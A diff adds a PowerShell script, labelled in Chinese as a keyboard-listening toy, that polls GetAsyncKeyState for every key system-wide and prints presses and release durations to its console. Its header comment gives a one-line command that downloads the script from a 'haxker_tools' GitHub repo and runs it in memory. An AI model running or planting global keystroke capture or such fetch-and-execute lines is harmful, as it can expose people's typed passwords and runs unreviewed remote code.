@@ -1,0 +1,101 @@
+# 請使用以下方法進行參數傳送
+# ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
+
+param(
+    [int]$time = 0
+)
+
+$signature = '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'
+$type = Add-Type -MemberDefinition $signature -Name 'WinAPI' -Namespace 'User32' -PassThru
+
+$keyStates = @{}
+$startTime = [DateTime]::Now
+
+function Get-KeyName([int]$vk) {
+    switch ($vk) {
+        1  { return '左鍵' }
+        2  { return '右鍵' }
+        8  { return 'Backspace' }
+        9  { return 'Tab' }
+        13 { return 'Enter' }
+        16 { return 'Shift' }
+        17 { return 'Ctrl' }
+        18 { return 'Alt' }
+        19 { return 'Pause' }
+        20 { return 'Caps Lock' }
+        27 { return 'ESC' }
+        32 { return 'Space' }
+        33 { return 'Page Up' }
+        34 { return 'Page Down' }
+        35 { return 'End' }
+        36 { return 'Home' }
+        37 { return '← (Left)' }
+        38 { return '↑ (Up)' }
+        39 { return '→ (Right)' }
+        40 { return '↓ (Down)' }
+        44 { return 'Print Screen' }
+        45 { return 'Insert' }
+        46 { return 'Delete' }
+        91 { return 'Win (Left)' }
+        92 { return 'Win (Right)' }
+        93 { return '選單鍵 (Apps)' }
+        144{ return 'Num Lock' }
+        145{ return 'Scroll Lock' }
+        default {
+            if ($vk -ge 48 -and $vk -le 57) { return [char]$vk }
+            if ($vk -ge 65 -and $vk -le 90) { return [char]$vk }
+            if ($vk -ge 96 -and $vk -le 105) { return 'NumPad ' + ($vk - 96) }
+            if ($vk -ge 112 -and $vk -le 123) { return 'F' + ($vk - 111) }
+            switch ($vk) {
+                186 { return ';' } 187 { return '=' } 188 { return ',' }
+                189 { return '-' } 190 { return '.' } 191 { return '/' }
+                192 { return '`' } 219 { return '[' } 220 { return '\' }
+                221 { return ']' } 222 { return "'" }
+                default { return 'VK_' + $vk }
+            }
+        }
+    }
+}
+
+Write-Host '============================================'
+if ($time -gt 0) {
+    Write-Host "   全鍵盤監聽玩具（倒數 $time 秒，或關閉視窗/Ctrl+C 結束）"
+} else {
+    Write-Host '   全鍵盤監聽玩具（無時間限制，請關閉視窗/Ctrl+C 結束）'
+}
+Write-Host '============================================'
+Write-Host ''
+
+while ($true) {
+    if ($time -gt 0) {
+        $elapsed = ([DateTime]::Now - $startTime).TotalSeconds
+        if ($elapsed -ge $time) {
+            Write-Host ''
+            Write-Host "[系統] 已達到指定的監聽時間 ($time 秒)，程式結束。"
+            break
+        }
+    }
+
+    for ($vk = 1; $vk -le 254; $vk++) {
+        $state = $type::GetAsyncKeyState($vk)
+        $isPressed = ($state -band 0x8000) -ne 0
+
+        if ($isPressed) {
+            if (-not $keyStates.ContainsKey($vk)) {
+                $keyStates[$vk] = [DateTime]::Now
+                $name = Get-KeyName $vk
+                Write-Host "按下 $name"
+            }
+        } else {
+            if ($keyStates.ContainsKey($vk)) {
+                $pressTime = $keyStates[$vk]
+                $duration = ([DateTime]::Now - $pressTime).TotalSeconds
+                $keyStates.Remove($vk)
+                $name = Get-KeyName $vk
+                $durStr = $duration.ToString('F1')
+                Write-Host "放開 $name 持續 $durStr 秒"
+            }
+        }
+    }
+    Start-Sleep -Milliseconds 15
+}
